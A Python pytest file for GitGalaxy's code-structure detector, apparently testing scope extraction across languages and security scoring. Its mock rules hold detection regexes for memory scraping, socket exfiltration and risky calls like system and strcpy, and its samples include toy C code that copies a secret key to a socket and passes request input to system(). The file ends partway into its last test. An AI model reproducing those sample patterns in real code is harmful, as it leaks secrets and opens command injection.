import logging
import math
import re
from unittest.mock import patch

import pytest

from gitgalaxy.core.detector import StructuralExtractor
from gitgalaxy.core.spatial_mapper import SpatialMapper

# ==============================================================================
# MOCK HARDWARE CALIBRATION
# ==============================================================================
# We mock the definitions so the pipeline operates deterministically without
# relying on external standards files.

MOCK_LANG_DEFS = {
    "python": {
        "lexical_family": "single_line_only",
        "rules": {
            "func_start": re.compile(r"^[ \t]*def\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\(", re.M),
            "branch": re.compile(r"\b(if|elif|for|while)\b"),
            "structural_boundaries": re.compile(r"\b(print|return|assign)\b"),
            "ownership": re.compile(r"#\s*Architect:\s*(.*)"),
            "_meta_purpose_line": re.compile(r"^Purpose:\s*(.*)"),
        },
    },
    "assembly": {
        "lexical_family": "single_line_only",
        "rules": {
            "func_start": re.compile(r"^([a-zA-Z0-9_]+):", re.M),
            "branch": re.compile(r"\b(JNE|JEQ|CALL)\b"),
            "structural_boundaries": re.compile(r"\b(MOV|PUSH|POP)\b"),
        },
    },
    "c": {
        "lexical_family": "c_style_comment",
        "rules": {
            "func_start": re.compile(r"^[ \t]*\w+\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\([^)]*\)\s*\{", re.M),
            "memory_scraping": re.compile(r"\b(memcpy|VirtualRead)\b"),
            "exfiltration_camouflage": re.compile(r"\b(send|socket)\b"),
            "high_risk_execution": re.compile(r"\b(strcpy|gets|system)\b"),
            "safety": re.compile(r"\b(strncpy|fgets)\b"),
            "io": re.compile(r"request_get"),
            "concurrency": re.compile(r"std::thread"),
            "state_mutation": re.compile(r"shared_state"),
            "sync_locks": re.compile(r"mutex_lock"),
            "memory_alloc": re.compile(r"malloc"),
            "cleanup": re.compile(r"free"),
        },
    },
    "sql": {
        "lexical_family": "single_line_only",
        "rules": {"io": re.compile(r"\b(SELECT|INSERT|UPDATE|DELETE)\b", re.I)},
    },
    "shell": {
        "lexical_family": "single_line_only",
        "rules": {
            "branch": re.compile(r"\b(if|case|for|while)\b"),
            "structural_boundaries": re.compile(r"\b(echo|export|source)\b"),
        },
    },
    "ruby": {
        "lexical_family": "single_line_only",
        "rules": {
            "branch": re.compile(r"(?<![:.])\b(if|unless|case|while|until)\b(?!:)"),
            "structural_boundaries": re.compile(r"(?<![:.])\b(puts|require|include)\b(?!:)"),
        },
    },
    "typescript": {
        "lexical_family": "c_style_comment",
        "rules": {},
    },
}


# ==============================================================================
# TEST 2: SPATIAL THREAT CORRELATION (The AppSec Sensor)
# ==============================================================================
def test_detector_spatial_appsec_correlation():
    """
    Proves the Spatial Map correctly amplifies penalties when an attacker reads
    memory and sends it out to a socket within a 200-character blast radius.
    """
    opt_detector = StructuralExtractor("c", MOCK_LANG_DEFS)
    code = (
        "void malicious_exfiltration_func() {\n"
        "    char buffer[100];\n"
        "    memcpy(buffer, secret_key, 100);  // Trigger: memory_scraping\n"
        "    send(socket, buffer, 100, 0);     // Trigger: exfiltration_camouflage\n"
        "}\n"
    )

    result = opt_detector.splice(code, "")

    # A single memory_scraping hit normally = 1.
    # The AppSec multiplier adds 100 if correlated. Total should be >= 100.
    assert result["equations"]["memory_scraping"] >= 100, "Spatial correlation failed to multiply the threat penalty!"
    assert result["mitigation_telemetry"]["amplified_leaks"] == 1, "Failed to log the active leak mitigation stat!"


def test_detector_exfiltration_check_does_not_cross_function_boundaries():
    """
    Regression test for #102: the Exfiltration Distance Check was the one
    correlate() pair #346/#348 missed when they scoped the other six to real
    function boundaries -- it kept running flat/unscoped in coding_analysis()
    until now. A memory read in one function and a socket send in a
    DIFFERENT, unrelated function must not correlate just because they're
    within the old flat 200-char radius.
    """
    opt_detector = StructuralExtractor("c", MOCK_LANG_DEFS)
    code = (
        "void reads_memory() {\n"
        "    memcpy(buffer, secret_key, 100);\n"
        "}\n"
        "\n"
        "void sends_elsewhere() {\n"
        "    send(socket, other_buffer, 100, 0);\n"
        "}\n"
    )

    result = opt_detector.splice(code, "")

    assert result["equations"]["memory_scraping"] == 1, (
        "A socket send in a DIFFERENT function must not amplify this memory read -- "
        "cross-function exfiltration correlation regressed!"
    )
    assert result["mitigation_telemetry"].get("amplified_leaks", 0) == 0


def test_detector_silencer_region():
    """
    Proves the Spatial Map correctly neutralizes danger signals if a safety wrapper
    exists within the 500-character silencer radius.
    """
    opt_detector = StructuralExtractor("c", MOCK_LANG_DEFS)
    code = (
        "void safe_wrapper() {\n"
        "    // Using strncpy for safety instead of strcpy\n"
        "    strncpy(dest, src, sizeof(dest));\n"
        "}\n"
    )

    result = opt_detector.splice(code, "")
    # The raw string "strcpy" is inside "strncpy", so both trigger in a naive regex.
    # The spatial math should subtract the danger hit.
    assert result["equations"]["high_risk_execution"] == 0, "Silencer region failed to dampen the danger signal!"
    assert result["mitigation_telemetry"]["mitigated_danger"] >= 1


# ==============================================================================
# TEST 3: THE ANTI-REDOS SHIELD
# ==============================================================================
def test_detector_anti_redos_line_limiter():
    """
    Proves that a catastrophic 2000+ character line (e.g., base64 blob) is safely
    blanked out to protect the multiprocessing pool, while preserving the LOC count.
    """
    opt_detector = StructuralExtractor("python", MOCK_LANG_DEFS)

    # Generate a 2500 character string
    massive_blob = "A" * 2500
    code = f"def parse_blob():\n    payload = '{massive_blob}'\n    return payload\n"

    # If the shield fails, the regex engine might hang. If it succeeds, it finishes instantly.
    result = opt_detector.splice(code, "")

    assert len(result["functions"]) == 1
    assert result["functions"][0]["name"] == "parse_blob"
    assert result["functions"][0]["coding_loc"] == 3, "Anti-ReDoS shield destroyed the physical line count!"


# ==============================================================================
# TEST 4: MODE E (TERMINATOR CLEAVING)
# ==============================================================================
def test_detector_terminator_cleaving():
    """
    Proves Mode E correctly chops SQL payloads by terminators (;) rather than
    braces or indentation scopes.
    """
    opt_detector = StructuralExtractor("sql", MOCK_LANG_DEFS)
    code = "SELECT * FROM users\nWHERE active = 1;\n\nUPDATE audit_log\nSET viewed = 1\nWHERE id = 55;\n"

    # Mode E requires specific handshake routing inside the engine
    with patch("gitgalaxy.core.detector.ScopeParsingRegistry.get_mode", return_value="mode_e"):
        result = opt_detector.splice(code, "")

        assert len(result["functions"]) >= 2, "Mode E failed to cleave the file into distinct blocks!"

        func_names = [f["name"] for f in result["functions"]]
        assert any("SELECT" in name for name in func_names), "Failed to ignite the SELECT block!"
        assert any("UPDATE" in name for name in func_names), "Failed to ignite the UPDATE block!"


def test_detector_class_extraction_and_state_entanglement():
    """
    Proves the engine accurately bounds OOP entities, links internal methods,
    and calculates State Entanglement without full AST parsing.
    """
    opt_detector = StructuralExtractor("python", MOCK_LANG_DEFS)
    code = (
        "class UserManager:\n"
        "    def __init__(self):\n"
        "        self.users = []\n"  # Hits 'state_mutation' (mutation)
        "    def add_user(self, user, role):\n"  # 2 args
        "        self.users.append(user)\n"  # Hits 'state_mutation'
        "        print(role)\n"
    )

    # Mocking a flux rule for testing state entanglement
    MOCK_LANG_DEFS["python"]["rules"]["state_mutation"] = re.compile(r"\b(append|users\s*=)\b")

    result = opt_detector.splice(code, "")

    assert len(result["classes"]) == 1, "Failed to extract the class boundary!"

    cls = result["classes"][0]
    assert cls["name"] == "UserManager"
    assert cls["method_count"] == 2, "Failed to spatially link methods to the parent class!"
    assert cls["state_entanglement"] > 0.0, "State entanglement failed to register mutations!"


def test_detector_nested_class_does_not_truncate_outer_scope_braces():
    """
    #1040: the class-scoping logic used to end a class's scope at the
    *next* class-declaration match, so a nested class's own `class` keyword
    truncated its enclosing class's scope early -- silently dropping every
    method declared after the nested class from the outer class's
    method_count. Verifies brace-depth tracking fixes this for brace-style
    languages, and that the nested class's own method isn't double-counted
    into the outer class too.
    """
    opt_detector = StructuralExtractor("c", MOCK_LANG_DEFS)
    code = (
        "class Outer {\n"
        "    void method1() { }\n"
        "\n"
        "    class Inner {\n"
        "        void innerMethod() { }\n"
        "    }\n"
        "\n"
        "    void method2() { }\n"
        "}\n"
    )

    result = opt_detector.splice(code, "")

    classes_by_name = {c["name"]: c for c in result["classes"]}
    assert set(classes_by_name) == {"Outer", "Inner"}, "Failed to extract both the outer and nested class!"

    assert classes_by_name["Outer"]["method_count"] == 2, (
        "method2 (declared after the nested class) was dropped from Outer's method_count!"
    )
    assert classes_by_name["Inner"]["method_count"] == 1

    outer_methods = [f["name"] for f in result["functions"] if f.get("parent_class_name") == "Outer"]
    assert "innerMethod" not in outer_methods, "Inner's method was double-counted into Outer's method list!"


def test_detector_nested_class_does_not_truncate_outer_scope_indentation():
    """
    Same #1040 regression, for indentation-scoped languages (Python): a
    nested class's dedent-tracked scope must not truncate the outer
    class's own scope the way the old flat "next class match" boundary did.
    """
    opt_detector = StructuralExtractor("python", MOCK_LANG_DEFS)
    code = (
        "class Outer:\n"
        "    def method1(self):\n"
        "        pass\n"
        "\n"
        "    class Inner:\n"
        "        def inner_method(self):\n"
        "            pass\n"
        "\n"
        "    def method2(self):\n"
        "        pass\n"
    )

    result = opt_detector.splice(code, "")

    classes_by_name = {c["name"]: c for c in result["classes"]}
    assert set(classes_by_name) == {"Outer", "Inner"}, "Failed to extract both the outer and nested class!"

    assert classes_by_name["Outer"]["method_count"] == 2, (
        "method2 (declared after the nested class) was dropped from Outer's method_count!"
    )
    assert classes_by_name["Inner"]["method_count"] == 1

    outer_methods = [f["name"] for f in result["functions"] if f.get("parent_class_name") == "Outer"]
    assert "inner_method" not in outer_methods, "Inner's method was double-counted into Outer's method list!"


def test_detector_atomic_literal_shield():
    """
    Proves the _apply_literal_shield safely blanks complex strings and heredocs
    without destroying physical line geometries.
    """
    opt_detector = StructuralExtractor("ruby", MOCK_LANG_DEFS)
    code = (
        "def query_database\n"
        "  sql = <<-SQL\n"
        "    SELECT * FROM users\n"
        "    WHERE active = true;\n"
        "    def fake_function_inside_string\n"
        "  SQL\n"
        "end\n"
    )

    # Access the shield directly
    safe_code = opt_detector._apply_literal_shield(code, "ruby")

    assert "def fake_function_inside_string" not in safe_code, "Shield failed to mask heredoc contents!"
    assert safe_code.count("\n") == code.count("\n"), "Shield altered the physical line count!"


def test_detector_orphan_and_duplicate_logic():
    """
    Proves the engine accurately identifies uncalled (orphan) functions
    and duplicated function definitions within a single file, and that both
    counts are aggregated into equations (orphaned_logic / duplicate_logic).
    """
    opt_detector = StructuralExtractor("python", MOCK_LANG_DEFS)
    code = (
        "def active_helper():\n"
        "    return True\n"
        "\n"
        "def forgotten_orphan():\n"
        "    pass\n"
        "\n"
        "def repeated_name():\n"
        "    pass\n"
        "\n"
        "def repeated_name():\n"
        "    pass\n"
        "\n"
        "def main_process():\n"
        "    if active_helper():\n"
        "        print('Running')\n"
    )

    result = opt_detector.splice(code, "")

    # active_helper is used, forgotten_orphan is not, main_process is the entry point
    orphans = [f["name"] for f in result["functions"] if f.get("usage_status") == 1]
    duplicates = [f["name"] for f in result["functions"] if f.get("usage_status") == 2]

    assert "forgotten_orphan" in orphans, "Failed to flag the unused function as an orphan!"
    assert "active_helper" not in orphans, "Falsely flagged an active function as an orphan!"
    assert duplicates.count("repeated_name") == 2, "Failed to flag both definitions of the duplicated function name!"

    # forgotten_orphan and main_process (never called, name > 3 chars) both flag as orphans.
    assert result["equations"].get("orphaned_logic", 0) == len(orphans), (
        "orphan_count was not aggregated into equations['orphaned_logic']!"
    )
    assert result["equations"].get("duplicate_logic", 0) == 2, (
        "duplicate_count was not aggregated into equations['duplicate_logic']!"
    )


def test_detector_duplicate_logic_is_scope_blind_to_shadowed_same_name_helpers():
    """
    Regression test for #1498: two functions sharing a name but with distinct
    bodies (e.g. a `go` helper reused across unrelated where/let scopes) must
    NOT be flagged as duplicate logic just because the name collides -- only
    genuinely repeated (same name AND same normalized body) definitions should.
    """
    opt_detector = StructuralExtractor("python", MOCK_LANG_DEFS)
    code = (
        "def go():\n"
        "    return 1\n"
        "\n"
        "def go():\n"
        "    return 2\n"
        "\n"
        "def repeated_name():\n"
        "    pass\n"
        "\n"
        "def repeated_name():\n"
        "    pass\n"
    )

    result = opt_detector.splice(code, "")

    duplicates = [f["name"] for f in result["functions"] if f.get("usage_status") == 2]

    assert duplicates.count("go") == 0, "Same-named functions with different bodies were falsely flagged as duplicates!"
    assert duplicates.count("repeated_name") == 2, "Genuinely repeated same-name/same-body functions were not flagged!"
    assert result["equations"].get("duplicate_logic", 0) == 2, (
        "duplicate_count should only include the true duplicate pair, not the shadowed 'go' helpers!"
    )


def test_detector_c_macro_dead_branch_shield():
    """
    Proves the Mode B Preprocessor Shield successfully blanks out dead
    #ifdef branches and multi-line macro continuations.
    """
    opt_detector = StructuralExtractor("c", MOCK_LANG_DEFS)
    code = (
        "void system_init() {\n"
        "#if defined(DEBUG_MODE)\n"
        "    int fake_danger = strcpy(dest, src);\n"
        "#else\n"
        "    int safe_ops = strncpy(dest, src, 10);\n"
        "#endif\n"
        "}\n"
    )

    result = opt_detector.splice(code, "")

    # Because 'high_risk_execution' is in the dead branch, it should be scrubbed by the preprocessor shield
    # before the regex engine even sees it.
    assert result["equations"]["high_risk_execution"] == 0, "Failed to scrub dead preprocessor branches!"


def test_detector_c_macro_else_branch_is_scanned_issue_1720():
    """
    Regression test for #1720: the preprocessor shield used to assume the
    first branch of every #if/#ifdef is the active one and blindly blanked
    the #else branch, so real implementations living in #else were silently
    dropped from extraction. With an unknown condition (e.g. #if FEATURE_FLAG)
    the shield now scans BOTH branches; only statically-decidable conditions
    (#if 0 / #if 1) prune a branch.
    """
    opt_detector = StructuralExtractor("c", MOCK_LANG_DEFS)
    code = (
        "#if FEATURE_FLAG\n"
        "int fastImplementation() {\n"
        "    return 1;\n"
        "}\n"
        "#else\n"
        "int portableImplementation() {\n"
        "    return 2;\n"
        "}\n"
        "#endif\n"
    )

    result = opt_detector.splice(code, "")

    names = [f["name"] for f in result["functions"]]
    assert "fastImplementation" in names, "First branch of an unknown #if must still be scanned!"
    assert "portableImplementation" in names, (
        "#1720: implementation living in the #else branch was dropped from extraction!"
    )


def test_detector_c_macro_static_truth_prunes_branches():
    """
    Companion to the #1720 fix: statically-decidable #if conditions still
    prune the dead branch. #if 0 => first branch dead, #else alive;
    #if 1 => first branch alive, #else dead. Nested blocks must also honor
    the outer branch's liveness (any() over the open-#if stack).
    """
    opt_detector = StructuralExtractor("c", MOCK_LANG_DEFS)

    code_if_zero = "#if 0\nint deadFast() {\n    return 1;\n}\n#else\nint aliveFallback() {\n    return 2;\n}\n#endif\n"
    names_zero = [f["name"] for f in opt_detector.splice(code_if_zero, "")["functions"]]
    assert "deadFast" not in names_zero, "#if 0 first branch must be pruned!"
    assert "aliveFallback" in names_zero, "#if 0 #else branch must survive!"

    code_if_one = "#if 1\nint aliveFast() {\n    return 1;\n}\n#else\nint deadFallback() {\n    return 2;\n}\n#endif\n"
    names_one = [f["name"] for f in opt_detector.splice(code_if_one, "")["functions"]]
    assert "aliveFast" in names_one, "#if 1 first branch must survive!"
    assert "deadFallback" not in names_one, "#if 1 #else branch must be pruned!"


def test_detector_c_macro_no_space_boundaries_issue_1764():
    """
    Regression test for a bug where `#if(1)` or `#elif(0)` (valid C preprocessor
    syntax without a space) failed to push onto the branch stack because
    `startswith("#if ")` was used. This led to premature `#endif` pops and
    desynced branch nesting.
    """
    opt_detector = StructuralExtractor("c", MOCK_LANG_DEFS)
    code = (
        "#if 0\n"
        "int deadOne() { return 1; }\n"
        "#if(1)\n"
        "int deadTwo() { return 2; }\n"
        "#endif\n"
        "int deadThree() { return 3; }\n"  # should stay dead -- still inside outer #if 0, before #else
        "#else\n"
        "int aliveOne() { return 4; }\n"
        "#endif\n"
    )

    result = opt_detector.splice(code, "")
    names = [f["name"] for f in result["functions"]]

    assert "deadThree" not in names, "Premature pop caused dead code to be scanned as alive!"
    assert "aliveOne" in names, "Valid #else branch was dropped due to stack desync!"

    code_nested = (
        "#if 0\n"
        "int a() { return 1; }\n"
        "#else\n"
        "int b() { return 2; }\n"
        "#if 1\n"
        "int c() { return 3; }\n"
        "#else\n"
        "int d() { return 4; }\n"
        "#endif\n"
        "int e() { return 5; }\n"
        "#endif\n"
    )
    names_nested = [f["name"] for f in opt_detector.splice(code_nested, "")["functions"]]
    assert set(names_nested) == {"b", "c", "e"}, (
        "Nested #if liveness was not honored: expected only b, c, e, got %r" % names_nested
    )


def test_detector_nested_function_is_counted_as_own_node_braces():
    """
    #1041: the brace-slicing guard used to skip any match whose start fell
    before the previously accepted match's end ("if start_idx < last_end_idx:
    continue"), on the theory that it must already be inside an in-progress
    function. A nested/inner function declaration necessarily starts before
    its enclosing function's end, so that guard silently dropped it instead
    of ever making it its own FunctionNode. Verifies both the outer and the
    nested function are extracted, each with its own independently correct
    (brace-depth-tracked) scope.
    """
    opt_detector = StructuralExtractor("c", MOCK_LANG_DEFS)
    code = "void outer() {\n    void inner() {\n        int x = 1;\n    }\n    inner();\n}\n"

    result = opt_detector.splice(code, "")

    names = [f["name"] for f in result["functions"]]
    assert set(names) == {"outer", "inner"}, "Nested function was silently dropped from extraction!"

    by_name = {f["name"]: f for f in result["functions"]}
    assert (by_name["outer"]["start_line"], by_name["outer"]["end_line"]) == (1, 6)
    assert (by_name["inner"]["start_line"], by_name["inner"]["end_line"]) == (2, 4), (
        "Nested function's own scope wasn't independently brace-depth-bounded!"
    )


# ==============================================================================
# TEST 5: MODE D (SEMANTIC HANDSHAKE STACK)
# ==============================================================================
def test_detector_mode_d_shell_handshake():
    """
    Proves Mode D correctly identifies scope boundaries using semantic keywords
    (if/fi, for/done) instead of braces, and prevents scope bleeding.
    """
    opt_detector = StructuralExtractor("shell", MOCK_LANG_DEFS)
    code = (
        "function backup_db() {\n"
        "    if [ -f $FILE ]; then\n"
        "        echo 'File exists.'\n"
        "    fi\n"
        "    for i in 1 2 3; do\n"
        "        echo $i\n"
        "    done\n"
        "}\n"
    )

    result = opt_detector.splice(code, "")

    assert len(result["functions"]) == 1, "Failed to extract the shell function as a single block!"

    func = result["functions"][0]
    assert func["name"] == "backup_db"
    assert func["coding_loc"] >= 6, "Line counting failed inside the semantic block!"
    assert func["branch_count"] == 2, "Failed to register internal structural branches!"


def test_detector_mode_d_ruby_inline_modifier():
    """
    Proves the engine's Ruby inline modifier guard prevents trailing conditionals
    from artificially inflating the scope stack and swallowing the file.
    """
    opt_detector = StructuralExtractor("ruby", MOCK_LANG_DEFS)
    code = (
        "def calculate_risk()\n"
        "    risk_exposure = 100 if user.is_admin?\n"
        "    return risk_exposure unless risk_exposure > 50\n"
        "end\n"
        "\n"
        "def secondary_process()\n"
        "    puts 'Processing'\n"
        "end\n"
    )

    result = opt_detector.splice(code, "")

    assert len(result["functions"]) == 2, "Inline modifiers corrupted the stack depth and swallowed the file!"

    names = [f["name"] for f in result["functions"]]
    assert "calculate_risk" in names
    assert "secondary_process" in names


def test_detector_mode_d_ruby_nested_methods_inside_class():
    """
    #1262: Mode D's stack-depth counter used to only ever emit a satellite for
    the OUTERMOST open scope -- a `def` encountered while already inside a
    `class`/`module` body just adjusted the shared depth counter and got
    folded into the enclosing satellite's text instead of becoming its own
    FunctionNode. Since virtually every real Ruby method lives inside a
    class/module, this meant GitGalaxy detected 0/117 real methods in the
    language-crucible Ruby corpus. Proves nested `def`s (including a
    singleton `def self.foo`, correctly reporting the bare name) each get
    their own function satellite now, alongside the class itself.
    """
    opt_detector = StructuralExtractor("ruby", MOCK_LANG_DEFS)
    code = (
        "class Widget\n"
        "  def self.build\n"
        "    new\n"
        "  end\n"
        "\n"
        "  def initialize\n"
        "    @count = 0\n"
        "  end\n"
        "\n"
        "  def increment\n"
        "    @count += 1\n"
        "  end\n"
        "end\n"
    )

    result = opt_detector.splice(code, "")
    names = [f["name"] for f in result["functions"]]
    class_names = [c["name"] for c in result.get("classes", [])]

    assert "build" in names, "Singleton method nested in a class was swallowed!"
    assert "initialize" in names, "Nested method was swallowed into the enclosing class satellite!"
    assert "increment" in names, "Nested method was swallowed into the enclosing class satellite!"
    assert "Widget" in class_names, "The enclosing class's own satellite should still be reported."


# ==============================================================================
# TEST 6: MODE C (INDENTATION STRATIFICATION)
# ==============================================================================
def test_detector_mode_c_indentation():
    """
    Proves Mode C correctly tracks Python indentation to close scopes,
    preventing nested functions or trailing text from bleeding into the parent.
    """
    opt_detector = StructuralExtractor("python", MOCK_LANG_DEFS)
    code = (
        "def parent_process():\n"
        "    print('Starting')\n"
        "    if True:\n"
        "        assign_val = 1\n"
        "\n"  # Blank lines should not break the scope
        "def adjacent_process():\n"
        "    return False\n"
    )

    result = opt_detector.splice(code, "")

    assert len(result["functions"]) == 2, "Mode C failed to separate Python functions by indentation!"

    parent = result["functions"][0]
    assert parent["name"] == "parent_process"
    assert parent["loc"] == 4, "Mode C failed to accurately count lines inside the indentation block!"


def test_detector_nested_function_is_counted_as_own_node_indentation():
    """
    Same #1041 regression as the brace-mode test above, for indentation-
    scoped languages (Python): a nested `def` must be extracted as its own
    FunctionNode with its own dedent-tracked scope, not silently merged into
    its enclosing function.
    """
    opt_detector = StructuralExtractor("python", MOCK_LANG_DEFS)
    code = "def outer():\n    def inner():\n        return 42\n    return inner()\n"

    result = opt_detector.splice(code, "")

    names = [f["name"] for f in result["functions"]]
    assert set(names) == {"outer", "inner"}, "Nested function was silently dropped from extraction!"

    by_name = {f["name"]: f for f in result["functions"]}
    assert (by_name["outer"]["start_line"], by_name["outer"]["end_line"]) == (1, 4)
    assert (by_name["inner"]["start_line"], by_name["inner"]["end_line"]) == (2, 3), (
        "Nested function's own scope wasn't independently dedent-bounded!"
    )


# ==============================================================================
# TEST 7: MODE A (GREEDY LABELS)
# ==============================================================================
def test_detector_mode_a_labels():
    """
    Proves Mode A correctly cleaves Assembly and COBOL blocks using greedy
    label matching until the next label or termination instruction.
    """
    opt_detector = StructuralExtractor("assembly", MOCK_LANG_DEFS)
    code = "INIT_SYSTEM:\n    MOV EAX, 1\n    PUSH EAX\n    CALL SETUP\nERROR_HANDLER:\n    POP EAX\n    RET\n"

    result = opt_detector.splice(code, "")

    assert len(result["functions"]) >= 2, "Mode A failed to slice Assembly labels!"

    func_names = [f["name"] for f in result["functions"]]
    assert "INIT_SYSTEM" in func_names
    assert "ERROR_HANDLER" in func_names


# ==============================================================================
# TEST 8: LEVEL 3 WIRING & FUNCTION CLASSIFICATION
# ==============================================================================
def test_detector_classification_and_wiring():
    """
    Proves the engine extracts outbound function calls (calls_out_to) for Level 3
    topology wiring and accurately classifies function types based on naming heuristics.
    """
    opt_detector = StructuralExtractor("python", MOCK_LANG_DEFS)
    code = "def save_user_data(user_id):\n    validate_id(user_id)\n    db_insert(user_id)\n    return True\n"

    result = opt_detector.splice(code, "")
    func = result["functions"][0]

    assert "validate_id" in func["calls_out_to"], "Failed to extract Level 3 outbound calls!"
    assert "db_insert" in func["calls_out_to"], "Failed to extract Level 3 outbound calls!"
    assert func["type_id"] == "mutation", "Failed to classify 'save_user_data' as a mutation!"


# ==============================================================================
# TEST 9: GHOST TETHER & METADATA EXTRACTION
# ==============================================================================
def test_detector_ghost_tether_and_metadata():
    """
    Proves the engine correctly parses the decoupled comment stream to extract
    ownership/purpose, and successfully maps docstrings back to their physical functions.
    """
    opt_detector = StructuralExtractor("python", MOCK_LANG_DEFS)
    code = (
        "def compute_hash():\n"
        "    '''\n"
        "    This is the internal docstring tethered to compute_hash.\n"
        "    '''\n"
        "    return True\n"
    )

    comment_stream = "# Architect: Ada Lovelace\n# Purpose: Handles core cryptographic operations.\n"

    # We must pass raw_content to allow the Ghost Tether to search coordinates
    result = opt_detector.splice(code, comment_stream, raw_content=code)

    # Check File Metadata
    assert result["metadata"]["ownership"] == "Ada Lovelace", "Failed to decode ownership from comment stream!"
    assert "cryptographic operations" in result["metadata"]["purpose"], "Failed to decode purpose from comment stream!"

    # Check Ghost Tether (Function-level docstring)
    func = result["functions"][0]
    assert "internal docstring tethered" in func["docstring"], (
        "Failed to tether the docstring to the physical function bounds!"
    )
    # Regression guard for #246
    assert "return True" not in func["docstring"], (
        "Docstring extraction ran past the closing delimiter and swallowed code!"
    )


# ==============================================================================
# TEST 10: OOP & MACRO NAME EXTRACTOR SHIELDS
# ==============================================================================
def test_detector_cpp_objc_name_extraction():
    """
    Proves the _extract_name logic safely isolates overloaded C++ operators,
    C++ testing macros, and Objective-C method signatures without destroying them.
    """
    opt_detector = StructuralExtractor("cpp", MOCK_LANG_DEFS)

    # Objective-C
    assert opt_detector._extract_name("- (void)initWithObjects:(NSArray *)objects {") == "initWithObjects"
    assert opt_detector._extract_name("+ (instancetype)sharedInstance;") == "sharedInstance"

    # C++ Operators
    # #1263: an out-of-line qualified operator overload must keep its class
    # qualifier (`MyClass::operator<<`), not just the bare `operator<<` --
    # func_start's own regex has captured the qualified form since #813/#821,
    # and dropping it here collided every same-symbol operator overload
    # across every class in a file into one function_data row.
    assert opt_detector._extract_name("MyClass::operator<<(std::ostream& os)") == "MyClass::operator<<"
    assert opt_detector._extract_name("operator bool() const") == "operator bool"
    assert opt_detector._extract_name("operator()()") == "operator()"

    # C++ Destructors
    # #1263: `~` must survive the final token-cleanup charset -- otherwise a
    # qualified destructor collides with its own class's constructor
    # (`MyClass::~MyClass` collapsing to plain `MyClass`).
    assert opt_detector._extract_name("MyClass::~MyClass()") == "MyClass::~MyClass"
    assert opt_detector._extract_name("Outer::Inner::~Inner()") == "Outer::Inner::~Inner"

    # C++ Macros
    assert opt_detector._extract_name("BOOST_AUTO_TEST_CASE(MyTestName)") == "MyTestName"
    assert opt_detector._extract_name("TEST_F(MySuite, MyGTestName)") == "MySuite"

    # #1565: Haskell's idiomatic trailing-apostrophe ("prime") naming
    # convention must survive this final token-cleanup charset intact --
    # otherwise a primed sibling like `convertWithOpts'` collapses onto its
    # unprimed counterpart `convertWithOpts`, the same collision shape #1263
    # fixed for C++ destructors/operators above.
    # func_start's own regex captures just the bare identifier for haskell
    # (the group `_slice_by_indentation` passes to `_extract_name` is
    # already isolated to the name), so that's the realistic input here.
    hs_detector = StructuralExtractor("haskell", MOCK_LANG_DEFS)
    assert hs_detector._extract_name("convertWithOpts'") == "convertWithOpts'"
    assert hs_detector._extract_name("  isWarning") == "isWarning"

    # BUG FIX (2026-08-21, tri-comparison-ledger-sweep follow-up): a Cython Tempita
    # codegen placeholder in a cdef return type (`cdef {{memviewslice_name}}
    # *get_slice_from_memview(...)`, cython/MemoryView.pyx) isn't a real body-opening
    # brace, but the split("{") truncation this function uses couldn't tell the
    # difference -- it cut the match down to just "cdef ", recording the bogus
    # function name "cdef" instead of the real "get_slice_from_memview".
    py_detector = StructuralExtractor("python", MOCK_LANG_DEFS)
    assert py_detector._extract_name("cdef {{memviewslice_name}} *get_slice_from_memview(") == "get_slice_from_memview"
    assert py_detector._extract_name("cdef {{el_type}} TargetFunc(") == "TargetFunc"


# ==============================================================================
# TEST 11: ADVANCED APPSEC SENSORS (PHASE 4)
# ==============================================================================
def test_detector_advanced_appsec_sensors():
    """
    Proves the Phase 4 spatial correlation matrix correctly calculates metrics
    for unmitigated Memory Leaks, Tainted RCE Injection, and Race Conditions.
    """
    opt_detector = StructuralExtractor("c", MOCK_LANG_DEFS)
    code = (
        "void vulnerable_rce() { system(request_get()); }\n"
        "void race_condition() { std::thread t(worker); shared_state = 1; }\n"
        "void memory_leak() { malloc(100); }\n"
    )

    result = opt_detector.splice(code, "")
    eqs = result["equations"]
    mits = result["mitigation_telemetry"]

    # 1. RCE Weaponization: high_risk_execution spatially overlapping with io (#344)
    assert eqs.get("sec_tainted_injection", 0) >= 1, "Failed to spatially correlate Tainted RCE Injection!"

    # 2. Race Conditions: concurrency overlapping with unlocked flux (multiplies by 5)
    assert eqs.get("concurrency", 0) >= 5, "Failed to detect and amplify the Race Condition penalty!"
    assert mits.get("amplified_race_conditions", 0) >= 1, "Failed to log the Race Condition telemetry!"

    # 3. Memory Leaks: unmitigated alloc
    assert eqs.get("memory_alloc", 0) >= 1, "Failed to flag the unmitigated Memory Leak!"


# ==============================================================================
# TEST 47: SATELLITE-SCOPED DAMPENER CORRELATION (#346 phase 1)
# ==============================================================================
def test_detector_dampeners_do_not_cross_function_boundaries():
    """
    Regression test for #346 phase 1: a safety/cleanup call in one function
    must not silently cancel a danger/leak signal in a DIFFERENT function,
    even though both are well within the old flat 500-char correlation
    radius. Before this fix, the two functions below (under 150 total
    characters apart) would have had their risk fully cancelled out.
    """
    opt_detector = StructuralExtractor("c", MOCK_LANG_DEFS)
    code = (
        "void dangerous_one() {\n    strcpy(buf, input);\n}\n\nvoid safe_two() {\n    strncpy(buf2, input2, 10);\n}\n"
    )

    result = opt_detector.splice(code, "")
    eqs = result["equations"]
    mits = result["mitigation_telemetry"]

    assert eqs.get("high_risk_execution", 0) == 1, (
        "A safety call in a DIFFERENT function must not mitigate this danger signal -- "
        "cross-function dampening regressed!"
    )
    assert mits.get("mitigated_danger", 0) == 0, (
        "mitigated_danger should be 0: the only safety call is in an unrelated function"
    )


def test_detector_dampeners_still_apply_within_same_function():
    """The same safety/cleanup call, when it's genuinely inside the SAME function, still mitigates."""
    opt_detector = StructuralExtractor("c", MOCK_LANG_DEFS)
    code = "void guarded() {\n    strcpy(buf, input);\n    strncpy(buf2, input2, 10);\n}\n"

    result = opt_detector.splice(code, "")
    eqs = result["equations"]
    mits = result["mitigation_telemetry"]

    assert eqs.get("high_risk_execution", 0) == 0, "Same-function safety call should still mitigate this danger signal"
    assert mits.get("mitigated_danger", 0) == 1


# ==============================================================================
# TEST 12: CATASTROPHIC FALLBACKS (HARDWARE GUILLOTINES)
# ==============================================================================
def test_detector_catastrophic_fallbacks():
    """
    Proves the engine gracefully zeroes out payloads on standard exceptions to prevent
    pool crashes, but explicitly raises TimeoutError to allow the Worker to kill the thread.
    """
    import pytest

    opt_detector = StructuralExtractor("python", MOCK_LANG_DEFS)
